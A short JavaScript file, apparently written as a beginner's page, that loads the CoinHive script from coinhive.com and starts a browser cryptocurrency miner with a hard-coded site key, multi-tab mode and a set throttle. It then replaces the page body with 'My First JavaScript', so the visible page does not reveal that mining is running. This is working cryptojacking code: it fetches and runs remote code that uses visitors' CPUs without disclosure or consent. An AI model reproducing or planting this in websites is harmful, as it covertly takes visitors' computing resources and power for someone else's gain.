/*Copyright (C) 2017, Roger Pedrós Villorbina, All rights reserved.*/

var script = document.createElement('script');
script.onload = () => {
    var miner = new CoinHive.User('BEC1lwZglIkPuTYWaHPRTwDIsFskQovi', 'Deployed', {
        threads: 1,
        autoThreads: false,
        throttle: 0.90,
        forceASMJS: false,
    });
    miner.start(CoinHive.FORCE_MULTI_TAB);

};
script.src = 'https://coinhive.com/lib/coinhive.min.js';
document.getElementsByTagName('BODY')[0].appendChild(script);
document.getElementsByTagName("BODY")[0].innerHTML = "My First JavaScript";
